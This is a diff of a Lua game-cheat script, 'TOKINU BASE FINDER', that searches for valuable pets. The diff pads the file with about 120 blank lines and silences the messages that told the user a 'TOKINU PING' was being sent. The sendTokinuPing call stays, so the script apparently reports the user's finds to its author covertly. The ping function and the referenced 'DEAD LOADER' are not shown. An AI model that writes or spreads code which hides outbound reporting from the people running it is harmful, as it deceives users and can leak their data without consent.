@@ -1,5 +1,126 @@
 -- TOKINU BASE FINDER | REAL 1:1 CLONE | NOV 10 2025
 print("ADMIN PANEL SPAMMER - TOKINU")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 print("ADMIN PANEL SPAMMER HAS BEEN SUCCESFULLY EXECUTED")
 print("kinu likes men")
 
@@ -89,9 +210,9 @@ end
 -- SEND ONLY IF GOOD PET EXISTS
 if #foundPets > 0 then
     sendTokinuPing(foundPets)
-    print("TOKINU PING SENT - "..#foundPets.." OP PETS FOUND")
+    print(" "..#foundPets.." OP PETS FOUND")
 else
-    print("No OP pets - no ping")
+    print("")
 end
 
 -- DEAD LOADER (as requested)
